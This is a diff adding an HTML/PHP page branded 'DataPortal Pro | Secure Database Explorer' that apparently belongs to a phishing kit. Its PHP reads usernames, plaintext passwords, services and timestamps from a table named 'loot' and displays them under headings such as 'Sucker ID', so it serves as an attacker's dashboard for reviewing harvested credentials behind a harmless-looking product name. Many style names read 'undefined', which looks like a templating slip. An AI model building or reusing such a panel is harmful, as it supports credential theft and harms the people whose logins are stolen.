@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en" class="undefined">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DataPortal Pro | Secure Database Explorer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <style>
+        :root {
+            --undefined-primary: #6b46c1;
+            --undefined-secondary: #9f7aea;
+            --undefined-accent: #d6bcfa;
+            --undefined-dark: #1a202c;
+            --undefined-light: #f7fafc;
+        }
+        
+        .bg-undefined-500 {
+            background-color: var(--undefined-primary);
+        }
+        
+        .bg-undefined-300 {
+            background-color: var(--undefined-accent);
+        }
+        
+        .text-undefined {
+            color: var(--undefined-primary);
+        }
+        
+        .hover\:bg-undefined-400:hover {
+            background-color: var(--undefined-secondary);
+        }
+        
+        .undefined {
+            background-color: var(--undefined-light);
+            color: var(--undefined-dark);
+        }
+        
+        .undefined-dark {
+            background-color: var(--undefined-dark);
+            color: var(--undefined-light);
+        }
+        
+        .table-responsive {
+            overflow-x: auto;
+        }
+        
+        .password-cell {
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body class="min-h-screen undefined">
+    <div class="container mx-auto px-4 py-8">
+        <header class="mb-8 text-center">
+            <div class="flex justify-center mb-4">
+                <i data-feather="database" class="w-12 h-12 text-undefined"></i>
+            </div>
+            <h1 class="text-3xl font-bold text-undefined mb-2">DataPortal Pro</h1>
+            <p class="text-gray-600">Secure Database Explorer</p>
+        </header>
+
+        <main>
+            <div class="bg-white rounded-lg shadow-lg overflow-hidden mb-8">
+                <div class="bg-undefined-500 px-6 py-4">
+                    <h2 class="text-xl font-semibold text-white flex items-center">
+                        <i data-feather="list" class="mr-2"></i>
+                        Database Records
+                    </h2>
+                </div>
+                
+                <div class="p-6">
+                    <?php
+                    require_once 'dbconnect.php';
+                    
+                    try {
+                        $conn = new mysqli($servername, $username, $password, $dbname);
+                        
+                        if ($conn->connect_error) {
+                            throw new Exception("Connection failed: " . $conn->connect_error);
+                        }
+                        
+                        $sql = "SELECT id, user, password, service, datetimestamp FROM loot";
+                        $result = $conn->query($sql);
+                        
+                        if ($result->num_rows > 0) {
+                            echo '<div class="table-responsive">';
+                            echo '<table class="w-full border-collapse">';
+                            echo '<thead>';
+                            echo '<tr class="bg-undefined-300">';
+                            echo '<th class="px-4 py-3 text-left">Sucker ID</th>';
+                            echo '<th class="px-4 py-3 text-left">Username</th>';
+                            echo '<th class="px-4 py-3 text-left">Password</th>';
+                            echo '<th class="px-4 py-3 text-left">Service Used</th>';
+                            echo '<th class="px-4 py-3 text-left">Date and Time Stamp</th>';
+                            echo '</tr>';
+                            echo '</thead>';
+                            echo '<tbody>';
+                            
+                            $rowCount = 0;
+                            while($row = $result->fetch_assoc()) {
+                                $rowClass = $rowCount % 2 === 0 ? 'bg-gray-50' : 'bg-white';
+                                echo '<tr class="' . $rowClass . ' hover:bg-undefined-400 hover:text-white transition-colors duration-200">';
+                                echo '<td class="px-4 py-3 border">' . htmlspecialchars($row["id"]) . '</td>';
+                                echo '<td class="px-4 py-3 border">' . htmlspecialchars($row["user"]) . '</td>';
+                                echo '<td class="px-4 py-3 border password-cell">' . htmlspecialchars($row["password"]) . '</td>';
+                                echo '<td class="px-4 py-3 border">' . htmlspecialchars($row["service"]) . '</td>';
+                                echo '<td class="px-4 py-3 border">' . htmlspecialchars($row["datetimestamp"]) . '</td>';
+                                echo '</tr>';
+                                $rowCount++;
+                            }
+                            
+                            echo '</tbody>';
+                            echo '</table>';
+                            echo '</div>';
+                        } else {
+                            echo '<div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4" role="alert">';
+                            echo '<p>No records found in the database.</p>';
+                            echo '</div>';
+                        }
+                        
+                        $conn->close();
+                    } catch (Exception $e) {
+                        echo '<div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4" role="alert">';
+                        echo '<p>Error: ' . htmlspecialchars($e->getMessage()) . '</p>';
+                        echo '</div>';
+                    }
+                    ?>
+                </div>
+            </div>
+        </main>
+
+        <footer class="mt-12 text-center text-gray-500 text-sm">
+            <p>© <?php echo date("Y"); ?> DataPortal Pro. All rights reserved.</p>
+            <p class="mt-2">
+                <i data-feather="shield" class="inline-block w-4 h-4 mr-1"></i>
+                Secure Database Connection
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        feather.replace();
+        
+        // Toggle undefined mode
+        function toggleUndefinedMode() {
+            document.documentElement.classList.toggle('undefined-dark');
+            document.documentElement.classList.toggle('undefined');
+        }
+    </script>
+</body>
+</html>
